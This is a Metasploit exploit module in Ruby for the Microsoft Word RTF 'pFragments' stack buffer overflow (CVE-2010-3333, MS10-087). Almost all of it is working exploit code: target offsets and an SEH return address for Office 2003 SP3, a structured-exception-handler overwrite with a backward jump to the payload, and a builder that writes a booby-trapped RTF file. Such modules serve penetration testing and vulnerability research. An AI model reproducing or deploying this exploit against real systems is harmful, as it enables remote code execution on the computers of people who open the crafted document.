##
# $Id: ms10_087_rtf_pfragments_bof.rb 11450 2010-12-29 20:30:50Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the handling of the
				'pFragments' shape property within the Microsoft Word RTF parser. All versions
				of Microsoft Office prior to the release of the MS10-087 bulletin are vulnerable.

				This module does not attempt to exploit the vulnerability via Microsoft Outlook.

				The Microsoft Word RTF parser was only used by default in versions of Microsoft 
				Word itself prior to Office 2007. With the release of Office 2007, Microsoft
				began using the Word RTF parser, by default, to handle rich-text messages within
				Outlook as well. It was possible to configure Outlook 2003 and earlier to use
				the Microsoft Word engine too, but it was not a default setting.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'wushi of team509',  # original discovery
					'unknown',           # exploit found in the wild
					'jduck'              # Metasploit module
				],
			'Version'        => '$Revision: 11450 $',
			'References'     =>
				[
					[ 'CVE', '2010-3333' ],
					[ 'OSVDB', '69085' ],
					[ 'MSB', 'MS10-087' ],
					[ 'BID', '44652' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=880' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 512,
					'BadChars'      => "\x00",
					'DisableNops'   => true # no need
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Office v11.8307.8324, winword.exe v11.0.8307.0
					[ 'Microsoft Office 2003 SP3 English on Windows XP SP3 English',
						{
							'Offsets' => [ 24536, 51112 ],
							'Ret' => 0x300294e7 # p/p/r in winword.exe
						}
					],

					# In order to exploit this bug on Office 2007, a SafeSEH bypass method is needed.
=begin
					# Office v12.0.6425.1000, winword.exe v12.0.6425.1000
					[ 'Microsoft Office 2007 SP2 English on Windows XP SP3 English',
						{
							'Offsets' => [ 5912 ],
							'Ret' => 0x30001ceb # p/p/r in winword.exe
						}
					],
=end

					# crash on a deref path to heaven.
					[ 'Crash Target for Debugging',
						{
							'Offsets' => [ 65535 ],
							'Ret' => 0xdac0ffee
						}
					]
				],
			'DisclosureDate' => 'Nov 09 2010'))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.rtf']),
			], self.class)
	end

	def exploit

		offsets = target['Offsets']

		# Prepare a sample SEH frame
		seh = generate_seh_record(target.ret)

		# Prepare a sample backward jump
		distance = offsets.max
		jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

		# RTF property Array parameters
		el_size = sz_rand()
		el_count = sz_rand()

		data = ''
		# These words are presumably incorrectly used
		# assert(amount1 <= amount2)
		data << [0x1111].pack('v') * 2
		data << [0xc8ac].pack('v')
		data << [0x1111].pack('v') * 22

		# Filler
		if target.name =~ /Debug/i
			rest = Rex::Text.pattern_create(offsets.max + seh.length + jmp_back.length)
		else
			rest = rand_text(offsets.max + seh.length + jmp_back.length)
		end

		# Add the payload
		rest[0, payload.encoded.length] = payload.encoded

		# Fill in the seh frames
		offsets.each { |off|
			rest[off, seh.length] = seh
			distance = off + seh.length
			jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
			rest[off + seh.length, jmp_back.length] = jmp_back
		}

		sploit = "%d;%d;" % [el_size, el_count]
		sploit << data.unpack('H*').first
		sploit << rest.unpack('H*').first

		content  = "{\\rtf1"
		content << "{\\shp"             # shape
		content << "{\\sp"              # shape property
		content << "{\\sn pFragments}"  # property name
		content << "{\\sv #{sploit}}"   # property value
		content << "}"
		content << "}"
		content << "}"

		print_status("Creating '#{datastore['FILENAME']}' file ...")
      file_create(content)

	end

	def sz_rand
		bad_sizes = [ 0, 2, 4, 8 ]
		x = rand(9)
		while bad_sizes.include? x
			x = rand(9)
		end
		x
	end

end

